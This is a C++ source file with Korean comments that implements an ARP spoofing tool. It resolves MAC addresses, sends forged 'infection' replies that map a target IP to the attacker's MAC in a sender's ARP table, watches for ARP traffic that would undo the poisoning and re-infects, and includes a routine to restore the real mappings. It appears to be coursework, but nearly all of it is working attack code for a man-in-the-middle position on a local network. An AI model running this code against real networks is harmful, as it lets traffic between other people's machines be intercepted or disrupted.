#include "arp_utils.h"

#include <cstdio>
#include <string>
#include <arpa/inet.h>

// 정상적인 ARP Request를 만든다.
//
// Attacker가 requestedIp를 사용하는 장비의 MAC 주소를
// 알아내기 위해 Broadcast ARP Request를 생성한다.
EthArpPacket makeArpRequest(
    const Mac& aMac,
    const Ip& aIp,
    const Ip& requestedIp
    ) {
    EthArpPacket packet{};

    // Ethernet 헤더
    packet.eth_.dmac_ = Mac("ff:ff:ff:ff:ff:ff");
    packet.eth_.smac_ = aMac;
    packet.eth_.type_ = htons(EthHdr::Arp);

    // ARP 헤더
    packet.arp_.hrd_ = htons(ArpHdr::ETHER);
    packet.arp_.pro_ = htons(EthHdr::Ip4);
    packet.arp_.hln_ = Mac::Size;
    packet.arp_.pln_ = Ip::Size;
    packet.arp_.op_ = htons(ArpHdr::Request);
    packet.arp_.smac_ = aMac;
    packet.arp_.sip_ = htonl(aIp);

    // Target MAC은 아직 모르기 때문에 00:00:00:00:00:00
    packet.arp_.tmac_ = Mac("00:00:00:00:00:00");
    packet.arp_.tip_ = htonl(requestedIp);

    return packet;
}

// Sender의 ARP Table을 변조하기 위한 감염 Reply를 만든다.
//
// Target IP의 MAC 주소가 Attacker MAC인 것처럼 ARP Reply를
// 전송하여 Sender의 ARP Table을 변조한다.
EthArpPacket makeInfectionReply(
    const Mac& aMac,
    const Mac& sMac,
    const Ip& sIp,
    const Ip& tIp
    ) {
    EthArpPacket packet{};

    // Ethernet 헤더
    packet.eth_.dmac_ = sMac;
    packet.eth_.smac_ = aMac;
    packet.eth_.type_ = htons(EthHdr::Arp);

    // ARP 헤더
    packet.arp_.hrd_ = htons(ArpHdr::ETHER);
    packet.arp_.pro_ = htons(EthHdr::Ip4);
    packet.arp_.hln_ = Mac::Size;
    packet.arp_.pln_ = Ip::Size;
    packet.arp_.op_ = htons(ArpHdr::Reply);

    // Target IP가 Attacker MAC을 사용한다고 속인다.
    packet.arp_.smac_ = aMac;
    packet.arp_.sip_ = htonl(tIp);
    packet.arp_.tmac_ = sMac;
    packet.arp_.tip_ = htonl(sIp);

    return packet;
}

// 만들어진 ARP 패킷을 pcap으로 전송한다.
bool sendArpPacket(
    pcap_t* pcap,
    const EthArpPacket& packet
    ) {
    int res = pcap_sendpacket(
        pcap,
        reinterpret_cast<const u_char*>(&packet),
        sizeof(EthArpPacket)
        );

    if (res != 0) {
        fprintf(
            stderr,
            "pcap_sendpacket return %d error=%s\n",
            res,
            pcap_geterr(pcap)
            );

        return false;
    }

    return true;
}

// requestedIp 장비가 보내는 ARP Reply를 수신한다.
//
// pcap        : pcap 핸들
// aMac        : Attacker MAC
// aIp         : Attacker IP
// requestedIp : MAC 주소를 알아내려는 IP
// resolvedMac : 알아낸 MAC 주소를 저장할 변수
bool receiveMac(
    pcap_t* pcap,
    const Mac& aMac,
    const Ip& aIp,
    const Ip& requestedIp,
    Mac& resolvedMac
    ) {
    struct pcap_pkthdr* header;
    const u_char* receivedPacket;

    while (true) {
        int res = pcap_next_ex(
            pcap,
            &header,
            &receivedPacket
            );

        if (res == 0) {
            continue;
        }

        if (res == -1) {
            fprintf(
                stderr,
                "pcap_next_ex fail: %s\n",
                pcap_geterr(pcap)
                );

            return false;
        }

        if (res == -2) {
            return false;
        }

        // EthArpPacket을 읽기 전에 이곳에서 한 번만 길이를 검사한다.
        if (header->caplen < sizeof(EthArpPacket)) {
            continue;
        }

        const EthArpPacket* packet =
            reinterpret_cast<const EthArpPacket*>(
                receivedPacket
                );

        // ARP Reply인지 한 번만 검사한다.
        if (
            ntohs(packet->eth_.type_) != EthHdr::Arp ||
            ntohs(packet->arp_.op_) != ArpHdr::Reply
            ) {
            continue;
        }

        // 요청한 IP가 Attacker에게 보낸 Reply인지 검사한다.
        if (
            ntohl(packet->arp_.sip_) != requestedIp ||
            ntohl(packet->arp_.tip_) != aIp ||
            packet->arp_.tmac_ != aMac
            ) {
            continue;
        }

        resolvedMac = packet->arp_.smac_;

        printf(
            "Resolved MAC: %s\n",
            std::string(resolvedMac).c_str()
            );

        return true;
    }
}

// 정상 ARP Request 전송과 ARP Reply 수신을 하나의 함수로 묶는다.
bool resolveMac(
    pcap_t* pcap,
    const Mac& aMac,
    const Ip& aIp,
    const Ip& requestedIp,
    Mac& resolvedMac
    ) {
    EthArpPacket request =
        makeArpRequest(
            aMac,
            aIp,
            requestedIp
            );

    if (!sendArpPacket(pcap, request)) {
        fprintf(stderr, "ARP Request 전송 실패\n");
        return false;
    }

    if (!receiveMac(
            pcap,
            aMac,
            aIp,
            requestedIp,
            resolvedMac
            )) {
        fprintf(
            stderr,
            "%s의 MAC 주소를 받지 못함\n",
            std::string(requestedIp).c_str()
            );

        return false;
    }

    return true;
}

// 모든 Session의 Sender MAC과 Target MAC을 조회한다.
bool resolveAllSessionMacs(
    pcap_t* pcap,
    const Mac& aMac,
    const Ip& aIp,
    std::vector<Session>& sessions
    ) {
    for (Session& session : sessions) {
        printf(
            "\nSender IP: %s, Target IP: %s\n",
            std::string(session.sIp).c_str(),
            std::string(session.tIp).c_str()
            );

        if (!resolveMac(
                pcap,
                aMac,
                aIp,
                session.sIp,
                session.sMac
                )) {
            return false;
        }

        if (!resolveMac(
                pcap,
                aMac,
                aIp,
                session.tIp,
                session.tMac
                )) {
            return false;
        }

        printf(
            "Sender: %s / %s\n",
            std::string(session.sIp).c_str(),
            std::string(session.sMac).c_str()
            );

        printf(
            "Target: %s / %s\n",
            std::string(session.tIp).c_str(),
            std::string(session.tMac).c_str()
            );
    }

    return true;
}

// 하나의 Session에 최초 감염 또는 재감염 패킷을 전송한다.
bool infectSession(
    pcap_t* pcap,
    const Mac& aMac,
    const Session& session
    ) {
    EthArpPacket infection =
        makeInfectionReply(
            aMac,
            session.sMac,
            session.sIp,
            session.tIp
            );

    return sendArpPacket(pcap, infection);
}

// 모든 Session의 Sender에게 최초 ARP 감염 패킷을 전송한다.
bool infectAllSessions(
    pcap_t* pcap,
    const Mac& aMac,
    const std::vector<Session>& sessions
    ) {
    for (const Session& session : sessions) {
        if (!infectSession(pcap, aMac, session)) {
            fprintf(
                stderr,
                "ARP 감염 패킷 전송 실패: %s\n",
                std::string(session.sIp).c_str()
                );

            return false;
        }

        printf(
            "ARP infection sent: %s\n",
            std::string(session.sIp).c_str()
            );
    }

    return true;
}

// Sender가 Target의 MAC 주소를 다시 묻는 ARP Request인지 검사한다.
static bool isSenderRequestingTarget(
    const EthArpPacket& arpPacket,
    const Session& session
    ) {
    return
        ntohs(arpPacket.arp_.op_) == ArpHdr::Request &&
        ntohl(arpPacket.arp_.sip_) == session.sIp &&
        arpPacket.arp_.smac_ == session.sMac &&
        ntohl(arpPacket.arp_.tip_) == session.tIp;
}

// Target이 Sender에게 자신의 정상 MAC 주소를 알려주는
// ARP Reply인지 검사한다.
static bool isTargetReplyingToSender(
    const EthArpPacket& arpPacket,
    const Session& session
    ) {
    return
        ntohs(arpPacket.arp_.op_) == ArpHdr::Reply &&
        ntohl(arpPacket.arp_.sip_) == session.tIp &&
        arpPacket.arp_.smac_ == session.tMac &&
        ntohl(arpPacket.arp_.tip_) == session.sIp &&
        arpPacket.arp_.tmac_ == session.sMac;
}

// 공통 수신 루프에서 받은 ARP 패킷을 처리한다.
//
// 1. Sender가 Target의 MAC을 다시 묻는 경우
// 2. Target이 Sender에게 정상 MAC을 알려주는 경우
//
// 두 상황 중 하나가 발생하면 해당 Sender를 다시 감염시킨다.
void handleArpPacket(
    pcap_t* pcap,
    const EthArpPacket& arpPacket,
    const Mac& aMac,
    const std::vector<Session>& sessions
    ) {
    for (const Session& session : sessions) {
        bool senderRequest =
            isSenderRequestingTarget(
                arpPacket,
                session
                );

        bool targetReply =
            isTargetReplyingToSender(
                arpPacket,
                session
                );

        if (!senderRequest && !targetReply) {
            continue;
        }

        if (!infectSession(pcap, aMac, session)) {
            fprintf(
                stderr,
                "ARP 재감염 패킷 전송 실패: %s\n",
                std::string(session.sIp).c_str()
                );
        } else if (senderRequest) {
            printf(
                "Sender ARP Request 감지: %s 재감염\n",
                std::string(session.sIp).c_str()
                );
        } else {
            printf(
                "Target ARP Reply 감지: %s 재감염\n",
                std::string(session.sIp).c_str()
                );
        }

        break;
    }
}

// Sender의 ARP Table을 정상 상태로 복구하기 위한
// 정상 ARP Reply를 생성한다.
//
// 감염 패킷:
// Target IP -> Attacker MAC
//
// 복구 패킷:
// Target IP -> Target MAC
EthArpPacket makeRecoveryReply(
    const Session& session
    ) {
    EthArpPacket packet{};

    // Ethernet 헤더
    packet.eth_.dmac_ = session.sMac;
    packet.eth_.smac_ = session.tMac;
    packet.eth_.type_ = htons(EthHdr::Arp);

    // ARP 헤더
    packet.arp_.hrd_ = htons(ArpHdr::ETHER);
    packet.arp_.pro_ = htons(EthHdr::Ip4);
    packet.arp_.hln_ = Mac::Size;
    packet.arp_.pln_ = Ip::Size;
    packet.arp_.op_ = htons(ArpHdr::Reply);

    // Target의 실제 IP/MAC 정보를 Sender에게 전달한다.
    packet.arp_.smac_ = session.tMac;
    packet.arp_.sip_ = htonl(session.tIp);
    packet.arp_.tmac_ = session.sMac;
    packet.arp_.tip_ = htonl(session.sIp);

    return packet;
}

// 하나의 Session에 정상 ARP 정보를 전송한다.
bool recoverSession(
    pcap_t* pcap,
    const Session& session
    ) {
    EthArpPacket recovery =
        makeRecoveryReply(session);

    return sendArpPacket(
        pcap,
        recovery
        );
}

// 모든 Session의 Sender ARP Table을 정상 상태로 복구한다.
bool recoverAllSessions(
    pcap_t* pcap,
    const std::vector<Session>& sessions
    ) {
    bool success = true;

    for (const Session& session : sessions) {
        if (!recoverSession(pcap, session)) {
            fprintf(
                stderr,
                "ARP 복구 패킷 전송 실패: %s\n",
                std::string(session.sIp).c_str()
                );

            success = false;
            continue;
        }

        printf(
            "ARP Table 복구 완료: %s -> %s\n",
            std::string(session.tIp).c_str(),
            std::string(session.tMac).c_str()
            );
    }

    return success;
}